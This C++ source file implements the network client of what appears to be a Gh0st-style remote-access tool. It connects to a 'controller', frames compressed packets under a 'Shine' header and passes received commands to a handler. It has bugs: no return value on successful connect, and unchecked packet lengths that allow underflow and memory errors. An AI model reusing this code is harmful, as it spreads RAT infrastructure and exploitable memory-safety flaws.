#include "_IOCPClient.h"


_CIOCPClient::_CIOCPClient()
{
	//初始化套接字类库
	WSADATA WsaData;
	if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0)
	{
		return;
	}
	
	m_ClientSocket = INVALID_SOCKET;
	m_WorkThreadHandle = NULL;
	m_EventHandle = CreateEvent(NULL, TRUE, FALSE, NULL);
	memcpy(m_PacketHeaderFlag, "Shine", PACKET_FLAG_LENGTH);
	m_IsReceiving = TRUE;
	

}
_CIOCPClient::~_CIOCPClient()
{
	//回收资源
	//关闭通讯套接字
	if (m_ClientSocket != INVALID_SOCKET)
	{
		closesocket(m_ClientSocket);
		m_ClientSocket = INVALID_SOCKET;
	}
	//关闭工作线程句柄
	if (m_WorkThreadHandle != WSA_INVALID_EVENT)
	{
		WSACloseEvent(m_WorkThreadHandle);
		m_WorkThreadHandle = WSA_INVALID_EVENT;
	}
	//关闭事件
	if (m_EventHandle != NULL)
	{
		CloseHandle(m_EventHandle);
		m_EventHandle = INVALID_HANDLE_VALUE;
	}

	WSACleanup();

}
BOOL  _CIOCPClient::ConnectServer(char* ServerIPAddress, USHORT  ServerConnectPort)
{
	//生成一个通信套接字
	m_ClientSocket = socket(AF_INET,SOCK_STREAM, IPPROTO_TCP);
	if (m_ClientSocket == SOCKET_ERROR)
	{
		return  FALSE;
	}
	//构造sockaddr_in结构也就是 Server的IPAddress结构
	sockaddr_in  ServerAddress;
	ServerAddress.sin_family = AF_INET;
	ServerAddress.sin_port = htons(ServerConnectPort);
	ServerAddress.sin_addr.S_un.S_addr = inet_addr(ServerIPAddress);

	//连接服务器
	if (connect(m_ClientSocket, (SOCKADDR *)&ServerAddress, sizeof(sockaddr_in)) == SOCKET_ERROR)
	{
		if (m_ClientSocket != INVALID_SOCKET)
		{
			closesocket(m_ClientSocket);
			m_ClientSocket = INVALID_SOCKET;
		}
		return  FALSE;
	}
	m_WorkThreadHandle = (HANDLE)CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)WorkThreadProcedure, (LPVOID)this, 0, NULL);
}
DWORD WINAPI  _CIOCPClient::WorkThreadProcedure(LPVOID  ParameterData)
{
	_CIOCPClient* This = (_CIOCPClient*)ParameterData;

	//定义套接字集合
	fd_set  OldSocketSet;
	fd_set  NewSocketSet;
	FD_ZERO(&OldSocketSet);
	FD_ZERO(&NewSocketSet);

	char  BufferData[PACKET_LENGTH] = { 0 };            //接受数据内存
	//选择模型
	//将上线通讯套接字放入到集合中
	FD_SET(This->m_ClientSocket, &OldSocketSet);
	while (This->IsReceiving())
	{
		NewSocketSet = OldSocketSet;
		//服务器如果没有数据发送客户端，将阻塞在select函数中
		int IsOk = select(NULL, &NewSocketSet, NULL, NULL, NULL);
		if (IsOk == SOCKET_ERROR)     //函数发生错误
		{
			This->Disconnect();
			printf("IsReceiving  关闭\r\n");
			break;
		}
		if (IsOk > 0)
		{
			//有信号
			memset(BufferData, 0, sizeof(BufferData));
			//接受主控端发来的数据
			int BufferLength = recv(This->m_ClientSocket,
				BufferData, sizeof(BufferData), 0);
			if (BufferLength <= 0)
			{
				printf("主控端关闭我了\r\n");
				This->Disconnect();
				break;
			}
			if (BufferLength > 0)
			{
				This->OnReceiving((char*)BufferData, BufferLength);
			}
		}
	}
	return 0;
}
void   _CIOCPClient::OnReceiving(char* BufferData, ULONG  BufferLength)
{
	//接到的数据进行解压缩
	try
	{
		if (BufferLength == 0)
		{
			Disconnect();
			return;
		}
		//将接受到的数据存储到m_ReceivedCompressedBufferData
		m_ReceivedCompressedBufferData.WriteArray((LPBYTE)BufferData, BufferLength);
		//检测数据是否大于数据头大小，如果不是那就不是正确的数据
		while (m_ReceivedCompressedBufferData.GetArrayLength() > PACKET_HEADER_LENGTH)
		{
			//存储数据包头部标志
			char  v1[PACKET_FLAG_LENGTH] = { 0 };
			//拷贝数据包头部标志
			CopyMemory(v1, m_ReceivedCompressedBufferData.GetArray(), PACKET_FLAG_LENGTH);
			//校验数据包头部标志
			if (memcmp(m_PacketHeaderFlag, v1, PACKET_FLAG_LENGTH) != 0)
			{
				throw"Bad Buffer";
			}
			//获取数据包总大小
			ULONG   PackTotalLength = 0;
			CopyMemory(&PackTotalLength,
				m_ReceivedCompressedBufferData.GetArray(PACKET_FLAG_LENGTH), sizeof(ULONG));

			int a = m_ReceivedCompressedBufferData.GetArrayLength();
			if (PackTotalLength && a >= PackTotalLength)
			{
				//初始数据包  [shine][压缩的长度+13][没有压缩的长度][HelloWorld..]
				ULONG  DecompressedLength = 0;               //没有压缩的长度

				m_ReceivedCompressedBufferData.ReadArray((PBYTE)v1, PACKET_FLAG_LENGTH);
				//[压缩的长度+13][没有压缩的长度][HelloWorld..]

				m_ReceivedCompressedBufferData.ReadArray((PBYTE)&PackTotalLength, sizeof(ULONG));
				//[没有压缩的长度][HelloWorld..]

				m_ReceivedCompressedBufferData.ReadArray((PBYTE)&DecompressedLength, sizeof(ULONG));
				//[HelloWorld..]

				ULONG  CompressedLength = PackTotalLength - PACKET_HEADER_LENGTH;
				//压缩数据
				PBYTE  CompressedData = new BYTE[CompressedLength];               //没有解压数据长度
																				  //解压数据
				PBYTE  DeCompressedData = new  BYTE[DecompressedLength];
				if (CompressedData == NULL || DeCompressedData == NULL)
				{
					throw" Bad Allocate";
				}
				//从数据包中读取压缩后的数据
				m_ReceivedCompressedBufferData.ReadArray(CompressedData, CompressedLength);
				//解压缩
				int IsOk = uncompress(DeCompressedData, &DecompressedLength, CompressedData, CompressedLength);
				if (IsOk == Z_OK)
				{
					m_ReceivedDecompressedBufferData.ClearArray();
					m_ReceivedCompressedBufferData.ClearArray();
					//拷贝真实数据
					m_ReceivedDecompressedBufferData.WriteArray(DeCompressedData, DecompressedLength);
					delete[] CompressedData;
					delete[] DeCompressedData;

					//处理数据
					m_ManagerObject->HandleIO((PBYTE)m_ReceivedDecompressedBufferData.GetArray(0),
						m_ReceivedDecompressedBufferData.GetArrayLength());

				}
				else
				{
					delete[] CompressedData;
					delete[] DeCompressedData;
					throw"Bad Buffer";
				}
			}
			else
			{
				break;
			}
		}
	}
	catch (...)
	{
		m_ReceivedDecompressedBufferData.ClearArray();
		m_ReceivedCompressedBufferData.ClearArray();
	}
	return ;
}
void   _CIOCPClient::Disconnect()
{
	//取消在当前对象上的异步请求
	CancelIo((HANDLE)m_ClientSocket);
	//通知工作线程退出的信号
	InterlockedExchange((LPLONG)&m_IsReceiving, FALSE);
	closesocket(m_ClientSocket);
	SetEvent(m_EventHandle);
	m_ClientSocket = INVALID_SOCKET;
}
int    _CIOCPClient::OnSending(char* BufferData, ULONG  BufferLength)
{
	m_SendCompressedBufferData.ClearArray();
	if (BufferLength > 0)
	{
		unsigned  long  ComprssedLength = (double)BufferLength*1.001 + 12;
		LPBYTE          CompressedData = new  BYTE[ComprssedLength];
		if (CompressedData == NULL)
		{
			return  0;
		}
		int  IsOk = compress(CompressedData, &ComprssedLength, (PBYTE)BufferData, BufferLength);
		//若压缩失败
		if (IsOk != Z_OK)
		{
			delete[]  CompressedData;
			return FALSE;
		}
		//计算数据包总长
		ULONG  PackTotalLength = ComprssedLength + PACKET_HEADER_LENGTH;
		//向数据包中写入数据

		m_SendCompressedBufferData.WriteArray((PBYTE)m_PacketHeaderFlag, sizeof(m_PacketHeaderFlag));
		//[Shine]

		m_SendCompressedBufferData.WriteArray((PBYTE)&PackTotalLength, sizeof(ULONG));
		//[Shine][PackTotalLength]

		m_SendCompressedBufferData.WriteArray((PBYTE)&BufferLength, sizeof(ULONG));
		//[Shine][PackTotalLength][BufferLength]

		m_SendCompressedBufferData.WriteArray(CompressedData, ComprssedLength);
		//[Shine][PackTotalLength][BufferLength][压缩后的真实数据]

		delete[]  CompressedData;
		CompressedData = NULL;
	}
	//分段发送数据
	return  SendWithSplit((char*)m_SendCompressedBufferData.GetArray(),
		m_SendCompressedBufferData.GetArrayLength(),
		MAX_SEND_BUFFER);
}
BOOL   _CIOCPClient::SendWithSplit(char* BufferData, ULONG BufferLength, ULONG SplitLength)
{
	int  ReturnLength = 0;
	const char* Travel = (char*)BufferData;
	int i = 0;
	ULONG  Sended = 0;
	ULONG  SendRetry = 15;
	int   j = 0;
	for (i = BufferLength; i >= SplitLength; i -= SplitLength)
	{
		for (j = 0; j < SendRetry; j++)
		{
			ReturnLength = send(m_ClientSocket, Travel, SplitLength, 0);
			if (ReturnLength > 0)
			{
				break;
			}
		}
		if (j == SendRetry)
		{
			return FALSE;
		}
		Sended += SplitLength;
		Travel += ReturnLength;
		Sleep(15);
	}
	if (i > 0)
	{
		for (int j = 0; j < SendRetry; j++)
		{
			ReturnLength = send(m_ClientSocket, Travel, i, 0);
			Sleep(15);
			if (ReturnLength > 0)
			{
				break;
			}
		}
		if (j == SendRetry)
		{
			return FALSE;
		}
		Sended += ReturnLength;
	}
	if (Sended == BufferLength)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}